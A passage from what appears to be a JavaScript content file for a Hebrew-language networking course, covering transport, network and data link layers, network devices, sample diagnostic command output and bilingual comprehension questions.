          <p>אחראית להעביר מידע מתכנית — תהליך — לתכנית מרוחקת.</p>
          <p><strong>שתי מטרות עיקריות:</strong></p>
          <ul>
            <li><strong>ריבוב אפליקציות</strong> — לתקשר עם ישות אחת — כתובת <code>IP</code> — ולהשתמש בכמה שירותים במקביל. כך הישות יודעת לאיזה שירות שייך כל זרם מידע.</li>
            <li><strong>העברה אמינה</strong> — אופציונלית. לא כל פרוטוקול בשכבת התעבורה מספק זאת.</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "פורטים (Ports)",
        content: `
          <p>מזהה התוכנה על השרת נקרא <strong>פורט</strong>.</p>
          <p>כתובת <code>IP</code> = הבניין, פורט = הדירה. בפניה לפורט מסוים, השרת יודע לאיזו תוכנה פונים.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 320 100" class="content-diagram">
              <rect x="40" y="10" width="120" height="80" rx="6" fill="var(--bg-elevated)" stroke="var(--accent)"/>
              <text x="100" y="35" text-anchor="middle" font-size="11" fill="var(--text)">שרת</text>
              <text x="100" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">IP: 192.168.1.1</text>
              <rect x="50" y="58" width="35" height="22" rx="2" fill="var(--accent-soft)"/><text x="67" y="73" text-anchor="middle" font-size="9">:80</text>
              <rect x="90" y="58" width="35" height="22" rx="2" fill="var(--accent-soft)"/><text x="107" y="73" text-anchor="middle" font-size="9">:443</text>
              <rect x="130" y="58" width="35" height="22" rx="2" fill="var(--accent-soft)"/><text x="147" y="73" text-anchor="middle" font-size="9">:25</text>
              <text x="55" y="85" text-anchor="middle" font-size="8" fill="var(--text-muted)">HTTP</text>
              <text x="107" y="85" text-anchor="middle" font-size="8" fill="var(--text-muted)">HTTPS</text>
              <text x="147" y="85" text-anchor="middle" font-size="8" fill="var(--text-muted)">אימייל</text>
            </svg>
            <p class="diagram-caption"><code>IP</code> = בניין, פורט = דירה. כל שירות מאזין על פורט אחר</p>
          </div>
          <p>לדוגמה: פורט 80 — ב־<code>TCP</code> — = שירות <code>HTTP</code>.</p>
          <p>אם נשלח הודעה לפורט 80, השרת מבין שמדובר בבקשת דף אינטרנט.</p>
          <p><strong>פורט פתוח</strong> = פורט שתוכנה מאזינה עליו ומוכנה לקבל חיבורים.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: פלט של פקודת netstat",
        content: `
          <p>כשרצים <code>netstat</code>, זה סוג הפלט שמופיע – הנה דוגמה:</p>
          <div class="code-preview">
            <pre><code>פרוטוקול   כתובת מקומית        כתובת רחוקה         מצב
TCP        127.0.0.1:5354       0.0.0.0:0           האזנה
TCP        0.0.0.0:80           0.0.0.0:0           האזנה
TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
          </div>
          <div class="demo-note">
          <p>📋 פירוש העמודות:</p>
          <ul>
            <li><strong>כתובת מקומית</strong> — ה־<code>IP</code> והפורט שעליהם המחשב מאזין. <code>0.0.0.0:80</code> = שירות <code>HTTP</code> פתוח לכולם.</li>
            <li><strong>מצב האזנה</strong> — פורט שמחכה לחיבורים נכנסים.</li>
            <li><strong>מחובר</strong> — חיבור פעיל כרגע.</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "TCP לעומת UDP",
        content: `
          <p><strong><code>TCP</code></strong> — פרוטוקול אמין</p>
          <p>מבטיח שכל המידע יגיע בסדר הנכון.</p>
          <p>דורש <code>Handshake</code> לפני שליחת נתונים.</p>
          <p><strong>מתאים ל:</strong></p>
          <ul>
            <li>דפדפן ואתרי אינטרנט</li>
            <li>אימייל</li>
            <li>העברת קבצים</li>
          </ul>

          <p><strong><code>UDP</code></strong> — פרוטוקול קל ומהיר</p>
          <p>שולח חבילות בלי לוודא שהגיעו.</p>
          <p>אין ערבויות על סדר או שלמות הנתונים.</p>
          <p><strong>מתאים ל:</strong></p>
          <ul>
            <li>שיחות וידאו וקול — <code>Zoom</code>, <code>Discord</code></li>
            <li>משחקים מרובי משתתפים</li>
            <li>שאילתות <code>DNS</code></li>
          </ul>

          <p><strong>הערה חשובה:</strong></p>
          <p><code>Netflix</code> ו־<code>YouTube</code> משתמשים דווקא ב־<code>TCP</code> — עדיף עיכוב קצר על פני שגיאות בתמונה.</p>
          <p><code>UDP</code> מתאים כשזמן תגובה חשוב יותר משלמות הנתונים.</p>
        `
      },
      {
        type: "explanation",
        title: "TCP Handshake – שלושת השלבים",
        content: `
          <p>לפני העברת מידע, <code>TCP</code> מבצע <strong><code>Handshake</code></strong> בן שלושה שלבים:</p>
          <ol>
            <li>הלקוח שולח <strong><code>SYN</code></strong> — "אני רוצה להתחבר"</li>
            <li>השרת עונה <strong><code>SYN-ACK</code></strong> — "מאושר, מתחברים"</li>
            <li>הלקוח שולח <strong><code>ACK</code></strong> — "קיבלתי"</li>
          </ol>
          <p>רק אחרי שלושת השלבים האלה מתחילה העברת המידע.</p>
          <p>לסגירת החיבור משתמשים בדגל <code>FIN</code> או <code>RST</code>.</p>
          <p><strong>דגלים</strong> — <code>Flags</code></p>
          <p>כל דגל הוא ביט בודד שמפעיל התנהגות מסוימת:</p>
          <ul>
            <li><code>SYN</code> — בקשת חיבור</li>
            <li><code>ACK</code> — אישור קבלה</li>
            <li><code>FIN</code> — סגירת חיבור</li>
            <li><code>RST</code> — איפוס חיבור</li>
            <li><code>PSH</code> — דחיפת נתונים מיידית</li>
          </ul>
        `
      },
      {
        type: "simulation",
        title: "הדמיית TCP Handshake",
        simId: "tcpHandshake",
        content: `<p>לחצו "הרץ הדמיה" כדי לראות את שלושת השלבים בזרימה – <code>SYN</code>, <code>SYN-ACK</code>, <code>ACK</code>.</p>`
      },
      {
        type: "explanation",
        title: "Sequence number ו־Acknowledgment",
        content: `
          <p><strong><code>Sequence Number</code></strong> — מספר סידורי</p>
          <p>מזהה את סדר הבייטים שנשלחים.</p>
          <p>כל צד מתחיל ממספר אקראי ומוסיף 1 לכל בייט שנשלח.</p>

          <p><strong><code>Acknowledgment</code></strong> — אישור קבלה</p>
          <p>הצד המקבל שולח: "קיבלתי עד בייט X, שלח את הבא."</p>
          <p>כך <code>TCP</code> מאשר קבלה ומזהה אובדן — אם <code>ACK</code> לא חוזר בזמן, השולח שולח שוב.
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 6",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>שכבת התעבורה = העברה מתהליך לתהליך מרוחק</li>
              <li>פורט = מזהה התוכנה על השרת. <code>netstat</code> מציג פורטים פתוחים וחיבורים</li>
              <li><code>TCP Handshake</code>: <code>SYN</code> → <code>SYN-ACK</code> → <code>ACK</code>. דגלים: <code>SYN</code>, <code>ACK</code>, <code>FIN</code>, <code>RST</code></li>
              <li><code>Sequence number</code> ו־<code>Acknowledgment</code> — זיהוי סדר ואובדן</li>
              <li><code>TCP</code> = אמין, <code>UDP</code> = מהיר בלי ערבויות</li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "פורטים ידועים ו־Ephemeral",
        content: `
          <p><strong>פורטים ידועים</strong> — טווח 0 עד 1023</p>
          <p>פורטים שמורים לשירותים מוכרים.</p>
          <p>השרת מאזין עליהם:</p>
          <ul>
            <li><code>80</code> — <code>HTTP</code></li>
            <li><code>443</code> — <code>HTTPS</code></li>
            <li><code>25</code> — <code>SMTP</code> — אימייל</li>
            <li><code>53</code> — <code>DNS</code></li>
          </ul>

          <p><strong>פורטים חולפים</strong> — <code>Ephemeral</code></p>
          <p>פורטים דינמיים בטווח 49152–65535.</p>
          <p>בכל חיבור חדש, הלקוח מקבל פורט מקור אקראי מהטווח הזה.</p>
          <p>השרת עונה לאותו פורט.</p>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 6",
        titleEn: "Chapter 6 — Comprehension Questions",
        questions: [
          {
            q: "למה צריך פורטים אם יש כבר כתובת IP?",
            a: "כתובת IP מזהה את המחשב. אבל שרת אחד יכול להריץ שירות אימייל, שירות HTTP, שירות FTP ועוד. כל שירות מאזין על פורט שונה. בלעדי הפורט, השרת לא היה יודע לאיזו תוכנה להפנות את הבקשה.",
            qEn: "Why do we need ports if we already have an IP address?",
            aEn: "The IP address identifies the computer. But one server can run email, HTTP, FTP and more. Each service listens on a different port. Without ports, the server would not know which program should handle the request."
          },
          {
            q: "מתי נבחר TCP ומתי UDP?",
            a: "TCP כשצריך שכל המידע יגיע בדיוק — דפים, קבצים, אימייל. UDP כשזמנים אמיתיים חשובים יותר מהשלמות — שיחת וידאו שעדיף פריים חסר מאשר עיכוב.",
            qEn: "When do we choose TCP and when UDP?",
            aEn: "TCP when all data must arrive exactly — web pages, files, email. UDP when real-time speed matters more than completeness — a video call where a missing frame is better than a delay."
          },
          {
            q: "מה תפקיד ה־Handshake ב־TCP?",
            a: "ה־Handshake — SYN, SYN-ACK, ACK — יוצר חיבור אמין לפני העברת מידע. שני הצדדים מאשרים שהם מוכנים לתקשורת. בלי Handshake, אי אפשר לדעת אם הצד השני קלט את החבילות.",
            qEn: "What is the role of the TCP Handshake?",
            aEn: "The Handshake — SYN, SYN-ACK, ACK — creates a reliable connection before sending data. Both sides confirm they are ready to communicate. Without a Handshake, you cannot know if the other side received the packets."
          }
        ]
      }
    ]
  },
  {
    id: 7,
    title: "שכבת הרשת",
    pages: [
      {
        type: "explanation",
        title: "תפקיד שכבת הרשת",
        content: `
          <p>שכבת התעבורה מניחה שאפשר להעביר חבילה ממחשב א' למחשב ב'.</p>
          <p><strong>שכבת הרשת</strong> — שכבה 3 — היא האחראית לתהליך זה.</p>
          <p>מטרת שכבת הרשת: להעביר חבילות מידע — <code>Packets</code> — מישות אחת לאחרת.</p>
          <p>ברשת האינטרנט המידע עובר דרך רכיבים רבים — נתבים ושרתים — עד שמגיע ליעד.</p>
          <p>שכבת הרשת דואגת לתהליך ההעברה בין כל הרכיבים האלה.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 360 100" class="content-diagram">
              <rect x="20" y="30" width="50" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="55" text-anchor="middle" font-size="10">מחשב</text>
              <circle cx="95" cy="50" r="12" fill="var(--accent-green)" stroke="var(--accent)"/>
              <text x="95" y="54" text-anchor="middle" font-size="8">נתב</text>
              <circle cx="155" cy="50" r="12" fill="var(--accent-green)" stroke="var(--accent)"/>
              <text x="155" y="54" text-anchor="middle" font-size="8">נתב</text>
              <path d="M 75 50 L 83 50 M 107 50 L 143 50 M 167 50 L 215 50" stroke="var(--accent)" stroke-width="2"/>
              <circle cx="235" cy="50" r="12" fill="var(--accent-green)" stroke="var(--accent)"/>
              <text x="235" y="54" text-anchor="middle" font-size="8">נתב</text>
              <path d="M 247 50 L 295 50" stroke="var(--accent)" stroke-width="2"/>
              <rect x="305" y="30" width="50" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="330" y="55" text-anchor="middle" font-size="10">שרת</text>
            </svg>
            <p class="diagram-caption">חבילות עוברות דרך נתבים בדרך ליעד</p>
          </div>
        `
      },
      {
        type: "explanation",
        title: "חבילות (Packets)",
        content: `
          <p>המידע מחולק לחבילות.</p>
          <p>בשכבת הרשת קוראים להן <strong><code>Packets</code></strong> — פקטות.</p>
          <p>כל חבילה מכילה את המידע עצמו, ומידע על כתובת המקור והיעד.</p>
          <p>הרכיבים בדרך משתמשים בכתובות כדי לדעת לאן להעביר כל חבילה.</p>
          <p>רוב המידע באינטרנט מועבר בשכבת הרשת, ולכן נוהגים לכנות כל יחידת מידע כזו "פקטה".</p>
        `
      },
      {
        type: "explanation",
        title: "מבנה חבילת IP – Header ושדות",
        content: `
          <p>חבילת <code>IP</code> כוללת <strong><code>IP Header</code></strong> ולאחריו <code>Data</code>. הגודל המינימלי של ה־<code>Header</code> הוא 20 בתים.</p>
          <p>שדות עיקריים ב־<code>Header</code>:</p>
          <ul>
            <li><strong><code>Source IP</code></strong> — כתובת השולח</li>
            <li><strong><code>Destination IP</code></strong> — כתובת היעד</li>
            <li><strong><code>TTL</code></strong> — <code>Time To Live</code> — מונה שמפחית בכל נתב. כשמגיע ל־0 החבילה נזרקת, מה שמונע לולאות אינסופיות</li>
            <li><strong><code>Protocol</code></strong> — מזהה את פרוטוקול השכבה הבאה: <code>TCP</code>=6, <code>UDP</code>=17, <code>ICMP</code>=1</li>
            <li><strong><code>Checksum</code></strong> — בדיקת שלמות הנתונים</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "מסכת רשת (Subnet Mask) ו־Default Gateway",
        content: `
          <p><strong><code>Subnet Mask</code></strong> — מסכת רשת</p>
          <p>קובע אילו ביטים בכתובת <code>IP</code> שייכים לרשת המקומית.</p>
          <p>כדי לחשב את כתובת הרשת, מבצעים פעולת <code>AND</code> לוגי בין ה־<code>IP</code> למסכה.</p>
          <p><strong>דוגמה:</strong></p>
          <p>מסכה <code>255.255.255.0</code> אומרת ש־3 הבתים הראשונים הם כתובת הרשת, והבית האחרון מזהה את המחשב ברשת.</p>

          <p><strong><code>Default Gateway</code></strong> — שער ברירת מחדל</p>
          <p>כשהיעד נמצא ברשת אחרת, המחשב שולח את החבילה ל־<code>Default Gateway</code>.</p>
          <p>זהו הנתב המקומי שמחבר את הרשת לרשתות אחרות.</p>
          <p>בלי <code>Default Gateway</code> — אין יציאה לאינטרנט.</p>
        `
      },
      {
        type: "explanation",
        title: "ICMP, DHCP ו-NAT",
        content: `
          <p><strong><code>ICMP</code></strong> — הודעות בקרה ושגיאות</p>
          <p>הפקודה <code>ping</code> שולחת <code>Echo Request</code> ומקבלת <code>Echo Reply</code>.</p>
          <p>שדה ה־<code>TTL</code> (Time To Live) מופחת ב־1 בכל נתב.</p>
          <p>כשה־<code>TTL</code> מגיע ל־0 — החבילה נזרקת, והנתב שולח הודעת <code>ICMP Time Exceeded</code>.</p>
          <p>הפקודה <code>traceroute</code> מנצלת התנהגות זו כדי לגלות את מסלול החבילה.</p>

          <p><strong><code>DHCP</code></strong> — הגדרות רשת אוטומטיות</p>
          <p>פרוטוקול שמאפשר למחשב חדש לקבל הגדרות רשת ללא הגדרה ידנית.</p>
          <p><strong>ארבעת שלבי <code>DHCP</code>:</strong></p>
          <ol>
            <li><strong><code>Discover</code></strong> — המחשב שולח שידור כללי: "מי שרת ה־<code>DHCP</code>?"</li>
            <li><strong><code>Offer</code></strong> — השרת מציע: כתובת <code>IP</code>, מסכת רשת, <code>Gateway</code>, שרת <code>DNS</code></li>
            <li><strong><code>Request</code></strong> — המחשב מאשר שהוא רוצה את ההצעה</li>
            <li><strong><code>Ack</code></strong> — השרת מאשר סופית</li>
          </ol>

          <p><strong><code>NAT</code></strong> — תרגום כתובות</p>
          <p>כתובות פרטיות — <code>10.x</code>, <code>172.16.x</code>, <code>192.168.x</code> — לא ניתנות לניתוב באינטרנט.</p>
          <p>הנתב מחליף את כתובת המקור והפורט לכתובת <code>IP</code> ציבורית ופורט ייחודי.</p>
          <p>טכניקה זו נקראת <code>PAT</code>.</p>
          <p>בתגובה שחוזרת, הנתב מחליף חזרה לפי טבלת התרגום שלו.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – שכבת הרשת",
        intro: "<p>זוויות מפתיעות על רשתות:</p>",
        blocks: [
          {
            title: "למה ה־IP נגמר? IPv4 vs IPv6",
            icon: "🌐",
            content: `
              <p><strong><code>IPv4</code></strong> תומך ב־2^32 כתובות — כ־4.3 מיליארד.</p>
              <p>נשמע הרבה, אבל האינטרנט גדל מעבר למספר הזה.</p>
              <p><strong><code>IPv6</code></strong> תומך ב־2^128 כתובות — מספיק לכל גרגר חול על כדור הארץ ועוד.</p>
              <p><code>NAT</code> מאפשר למיליוני מחשבים להשתמש ב-<code>IP</code> ציבורי אחד, אבל זהו פתרון עוקף. <code>IPv6</code> פותר את הבעיה מהשורש.</p>
            `
          },
          {
            title: "האם אפשר לרשת את העולם בסיב אופטי אחד?",
            icon: "📡",
            content: `
              <p>סיב אופטי יכול להעביר טרה-ביטים בשנייה.</p>
              <p>בתאוריה, עם קידוד מתקדם, סיב אחד יכול לשאת את כל תעבורת האינטרנט העולמית.</p>
              <p>בפועל, מרחק, רעש ועלויות מגבילים.</p>
              <p>אבל הרעיון החשוב הוא: <strong>המגבלה היא לא הפיזיקה, אלא הארגון.</strong></p>
              <p>הרשת בנויה ממיליוני רכיבים שמתקשרים ביניהם – הבעיה היא תיאום, לא רוחב פס.</p>
            `
          }
        ]
      },
      {
        type: "demo",
        title: "המדריך מדגים: מה מראה Traceroute",
        content: `
          <p>כשרצים <code>traceroute</code> (או כלי ויזואלי דומה), זה סוג הפלט – רואים את המסלול שעוברת החבילה:</p>
          <div class="code-preview">
            <pre><code>1   router.local (192.168.1.1)    2 ms
2   isp-gateway (10.0.0.1)       12 ms  
3   backbone-1 (212.143.xxx.x)   25 ms
4   google-server (172.217.x.x)   45 ms</code></pre>
          </div>
          <p class="demo-note">📋 פירוש הפלט:</p>
          <ul>
            <li>כל שורה = <strong><code>hop</code></strong> אחד — רכיב ברשת — נתב, שרת — שהחבילה עברה דרכו.</li>
            <li>מספרי ה־<code>ms</code> — זמן התגובה לאותו hop.</li>
            <li>כך רואים את "הדרך" המלאה מהמחשב ועד לשרת היעד.</li>
          </ul>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 7",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>שכבת הרשת = העברת חבילות — <code>Packets</code> — מישות לישות</li>
              <li>כל חבילה מכילה כתובת מקור ויעד</li>
              <li>נתבים — <code>Routers</code> — מעבירים חבילות לפי טבלאות ניתוב</li>
              <li><code>Traceroute</code> מציג את מסלול החבילות ברשת</li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "טבלת ניתוב (Routing Table)",
        content: `
          <p><strong>טבלת ניתוב</strong> — <code>Routing Table</code></p>
          <p>לכל נתב יש טבלת ניתוב — רשימה שמתארת לאן לשלוח כל חבילה.</p>
          <p><strong>דוגמה:</strong></p>
          <ul>
            <li>"כל כתובת ב-<code>192.168.1.x</code> — שלח לפורט 1 (רשת מקומית)"</li>
            <li>"כל השאר — שלח לנתב <code>10.0.0.1</code> (<code>Default Gateway</code>)"</li>
          </ul>
          <p>הנתב בודק את <code>Destination IP</code> של כל חבילה.</p>
          <p>הוא מחפש התאמה בטבלה ומעביר לרכיב הבא במסלול.</p>
        `
      },
      { type: "simulation", title: "הדמיית Ping ו-Traceroute", simId: "ping", content: "<p>שלחו חבילות ICMP וראו את המסלול שהן עוברות.</p>" },
      { type: "simulation", title: "הדמיית DHCP", simId: "dhcp", content: "<p>ראו את ארבעת השלבים של קבלת כתובת IP אוטומטית.</p>" },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 7",
        titleEn: "Chapter 7 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין שכבת התעבורה לשכבת הרשת?",
            a: "שכבת התעבורה מעבירה מידע מתהליך לתהליך (מחשב למחשב ברמת היישום). שכבת הרשת אחראית על ההעברה של החבילות בין כל הרכיבים – נתבים, שרתים – עד שהחבילה מגיעה ליעדה.",
            qEn: "What is the difference between the Transport layer and the Network layer?",
            aEn: "The Transport layer moves data from process to process (application level). The Network layer is responsible for moving packets between all devices — routers, servers — until the packet reaches its destination."
          },
          {
            q: "מהו נתב (Router)?",
            a: "נתב הוא רכיב רשת שמקבל חבילות ומעביר אותן הלאה. לכל נתב יש טבלת ניתוב — routing table — מפה שאומרת 'לכתובת X לשלוח לנתב Y'. כך החבילה עוברת מרכיב לרכיב עד שמגיעה ליעד.",
            qEn: "What is a Router?",
            aEn: "A router is a network device that receives packets and forwards them. Each router has a routing table — a map that says 'for address X, send to router Y'. This way the packet moves from device to device until it reaches the destination."
          },
          {
            q: "מה עושה TTL ולמה traceroute משתמש בו?",
            a: "TTL — Time To Live — כל נתב מפחית ב־1. אם מגיע 0 — החבילה נזרקת ונשלח ICMP Time Exceeded. traceroute שולח חבילות עם TTL 1, 2, 3... — כל נתב שמחזיר Time Exceeded מזוהה. כך בונים את המסלול.",
            qEn: "What does TTL do and why does traceroute use it?",
            aEn: "TTL — Time To Live — each router decreases it by 1. When it reaches 0, the packet is dropped and an ICMP Time Exceeded is sent. traceroute sends packets with TTL 1, 2, 3... — each router that returns Time Exceeded is identified. This builds the route map."
          }
        ]
      }
    ]
  },
  {
    id: 8,
    title: "שכבת הקו",
    pages: [
      {
        type: "explanation",
        title: "תפקיד שכבת הקו",
        content: `
          <p><strong>שכבת הקו</strong> — <code>Data Link Layer</code></p>
          <p>שכבת הרשת אחראית על המסלול.</p>
          <p>שכבת הקו אחראית על תקשורת בין מכשירים <strong>מחוברים ישירות</strong>.</p>
          <p>חיבור ישיר = כבל, <code>WiFi</code>, או לווין.</p>
          <p>שכבת הקו מספקת ממשק להעברת מידע בין מכשירים צמודים.</p>
          <p>שכבת הרשת לא צריכה לדאוג לסוג החיבור — זה תפקיד שכבת הקו.</p>
        `
      },
      {
        type: "explanation",
        title: "Ethernet וכתובות MAC",
        content: `
          <p><strong>כתובות <code>MAC</code></strong> — <code>Media Access Control</code></p>
          <p>כתובות פיזיות, צרובות על כרטיס הרשת.</p>
          <p>הפורמט — 6 בתים בהקסדצימלי.</p>
          <p><strong>דוגמה:</strong> <code>d4:be:d9:d6:0c:2a</code></p>
          <p>במסגרת <code>Ethernet</code> יש שני שדות <code>MAC</code>:</p>
          <ul>
            <li><code>dst</code> — כתובת היעד</li>
            <li><code>src</code> — כתובת המקור</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "מבנה מסגרת Ethernet — Frame",
        content: `
          <p><strong>מסגרת <code>Ethernet</code></strong> — <code>Ethernet Frame</code></p>
          <p>מורכבת מהשדות הבאים:</p>
          <ul>
            <li><strong><code>Preamble</code></strong> — סינכרון בין השולח למקבל</li>
            <li><strong><code>Destination MAC</code></strong> — 6 בתים — כתובת היעד</li>
            <li><strong><code>Source MAC</code></strong> — 6 בתים — כתובת המקור</li>
            <li><strong><code>EtherType</code></strong> — סוג הפרוטוקול שבפנים — למשל <code>IPv4</code>, <code>ARP</code></li>
            <li><strong><code>Payload</code></strong> — החבילה משכבת הרשת</li>
            <li><strong><code>FCS</code></strong> — <code>Frame Check Sequence</code> — בדיקת שגיאות באמצעות <code>CRC</code></li>
          </ul>
          <p>גודל מינימלי — 64 בתים.</p>
          <p>גודל מקסימלי — 1518 בתים.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: פלט של ipconfig",
        content: `
          <p>כשמריצים <code>ipconfig</code> — ב-Windows — או <code>ifconfig</code> — ב-Linux/Mac — מתקבל מידע על ממשקי הרשת.</p>
          <div class="code-preview">
            <pre><code>Ethernet adapter Ethernet:
   IPv4 Address: 192.168.1.105
   Subnet Mask: 255.255.255.0
   Default Gateway: 192.168.1.1
   Physical Address: D4-BE-D9-D6-0C-2A</code></pre>
          </div>
          <p class="demo-note">📋 פירוש השדות:</p>
          <ul>
            <li><strong><code>IPv4</code></strong> — כתובת המחשב ברשת.</li>
            <li><strong><code>Subnet Mask</code></strong> — גבול הרשת המקומית.</li>
            <li><strong><code>Default Gateway</code></strong> — הנתב שמחבר לאינטרנט.</li>
            <li><strong><code>Physical Address</code></strong> — כתובת ה־<code>MAC</code> של כרטיס הרשת.</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "פרוטוקול ARP",
        content: `
          <p><strong><code>ARP</code></strong> — <code>Address Resolution Protocol</code></p>
          <p>ממיר כתובת <code>IP</code> לכתובת <code>MAC</code>.</p>
          <p>התהליך עובד כך:</p>
          <ol>
            <li>המחשב רוצה לשלוח ל-<code>192.168.1.1</code> אבל לא יודע את כתובת ה-<code>MAC</code> שלו</li>
            <li>שולח <strong><code>ARP Request</code></strong> ב-<code>Broadcast</code> לכל הרשת — "למי יש <code>192.168.1.1</code>?"</li>
            <li>הנתב עונה ב-<strong><code>ARP Reply</code></strong> — <code>Unicast</code> — עם כתובת ה-<code>MAC</code> שלו</li>
            <li>המיפוי נשמר ב-<strong><code>ARP Cache</code></strong> לשימוש עתידי</li>
          </ol>
          <p>הפקודה <code>arp -a</code> מציגה את טבלת ה-<code>ARP Cache</code>.</p>
        `
      },
      { type: "simulation", title: "הדמיית ARP", simId: "arp", content: "<p>ראו איך מכשיר מגלה כתובת MAC של מכשיר אחר ברשת.</p>" },
      {
        type: "summary",
        title: "סיכום פרק 8",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>שכבת הקו = העברה בין מכשירים מחוברים ישירות</li>
              <li><code>MAC</code> = כתובת פיזית. מבנה <code>Frame</code> — <code>Preamble</code>, <code>dst/src MAC</code>, <code>EtherType</code>, <code>Payload</code>, <code>FCS</code></li>
              <li><code>ARP</code> = המרת <code>IP</code> ל-<code>MAC</code>. <code>ipconfig</code>/<code>ifconfig</code> — הצגת הגדרות</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 8",
        titleEn: "Chapter 8 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין MAC ל־IP?",
            a: "MAC — כתובת פיזית צרובה על כרטיס הרשת, משמשת ברשת המקומית — שכבת קו. IP — כתובת לוגית שמיועדת לניתוב ברשתות — שכבת רשת. ARP ממיר IP ל־MAC כשצריך לשלוח Frame.",
            qEn: "What is the difference between MAC and IP?",
            aEn: "MAC is a physical address burned into the network card, used in the local network — Data Link layer. IP is a logical address used for routing between networks — Network layer. ARP converts IP to MAC when you need to send a Frame."
          },
          {
            q: "למה ARP משתמש ב-Broadcast?",
            a: "המחשב לא יודע איזה מכשיר ברשת המקומית מחזיק את ה-IP המבוקש – הוא שואל את כולם. רק בעל ה-IP עונה. ברשתות גדולות יש טכניקות כמו Proxy ARP ו-ARP Cache לצמצום התעבורה.",
            qEn: "Why does ARP use Broadcast?",
            aEn: "The computer does not know which device on the local network has the requested IP — so it asks everyone. Only the owner of the IP responds. In large networks, techniques like Proxy ARP and ARP Cache reduce this traffic."
          }
        ]
      }
    ]
  },
  {
    id: 9,
    title: "רכיבי רשת",
    pages: [
      {
        type: "explanation",
        title: "Hub, Switch, Router",
        content: `
          <p>שלושה רכיבי רשת מרכזיים, כל אחד עובד בשכבה אחרת:</p>
          <p><strong><code>Hub</code></strong> — שכבה 1</p>
          <p>לא מכיר כתובות. מעביר כל מידע לכל המכשירים המחוברים.</p>
          <p><strong><code>Switch</code></strong> — שכבה 2</p>
          <p>מכיר כתובות <code>MAC</code>. מעביר מידע רק ליעד הנכון.</p>
          <p><strong><code>Router</code></strong> — שכבה 3</p>
          <p>מכיר כתובות <code>IP</code>. מנתב חבילות בין רשתות שונות.</p>
          <table class="content-table">
            <tr><th>רכיב</th><th>שכבה</th><th>כתובות</th></tr>
            <tr><td><code>Hub</code></td><td>פיזית</td><td>לא מכיר</td></tr>
            <tr><td><code>Switch</code></td><td>קו</td><td><code>MAC</code></td></tr>
            <tr><td><code>Router</code></td><td>רשת</td><td><code>IP</code></td></tr>
          </table>
        `
      },
      {
        type: "explanation",
        title: "Hub – שכבת פיזית",
        content: `
          <p><strong><code>Hub</code></strong> — שכבה 1</p>
          <p>מקבל ביטים מפורט אחד ומשכפל אותם לכל שאר הפורטים.</p>
          <p>אין בו שום אינטליגנציה — הוא לא יודע לאן לשלוח.</p>
          <p>כתוצאה, כל מחשב ברשת מקבל את כל התעבורה.</p>
          <p>זה יוצר התנגשויות — <code>Collisions</code> — וגורם לשיתוף רוחב הפס בין כולם.</p>
          <p>כיום כמעט לא בשימוש — הוחלף ב-<code>Switch</code>.</p>
        `
      },
      {
        type: "explanation",
        title: "Switch – שכבת קו",
        content: `
          <p><strong><code>Switch</code></strong> — שכבה 2</p>
          <p>לומד את טבלת ה-<code>MAC</code> — מיפוי כתובת לפורט — מהתעבורה שעוברת דרכו.</p>
          <p>כשמגיע <code>Frame</code>, ה-<code>Switch</code> בודק את <code>Destination MAC</code> ושולח רק לפורט המתאים.</p>
          <p>כך הוא מפחית התנגשויות ומנצל את רוחב הפס בצורה טובה יותר.</p>
          <p><strong>Switch חכם</strong> — <code>Managed Switch</code></p>
          <p>מאפשר גם חלוקה ל-<code>VLANs</code> וניהול מתקדם.</p>
        `
      },
      {
        type: "explanation",
        title: "Router – שכבת רשת",
        content: `
          <p><strong><code>Router</code></strong> — שכבה 3</p>
          <p>מחבר בין רשתות <code>IP</code> שונות.</p>
          <p>יש לו טבלת ניתוב שמגדירה לכל יעד לאן לשלוח.</p>
          <p><strong>תהליך העבודה:</strong></p>
          <ol>
            <li>ה-<code>Router</code> מקבל חבילת <code>IP</code></li>
            <li>בודק את <code>Destination IP</code></li>
            <li>מחפש התאמה בטבלת הניתוב</li>
            <li>מעביר לנתב הבא או למחשב ברשת המקומית</li>
          </ol>
        `
      },
      {
        type: "explanation",
        title: "VLAN – רשת מקומית וירטואלית",
        content: `
          <p><strong><code>VLAN</code></strong> — <code>Virtual LAN</code></p>
          <p>מאפשר לחלק <code>Switch</code> פיזי אחד לכמה רשתות לוגיות נפרדות.</p>
          <p>כל פורט ב-<code>Switch</code> משויך ל-<code>VLAN</code> מסוים.</p>
          <p>מחשבים באותו <code>VLAN</code> מתקשרים ביניהם.</p>
          <p>מחשבים ב-<code>VLAN</code>-ים שונים לא יכולים לתקשר ישירות.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 320 140" class="content-diagram">
              <rect x="100" y="60" width="120" height="50" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="160" y="90" text-anchor="middle" font-size="11" fill="var(--text)">Switch</text>
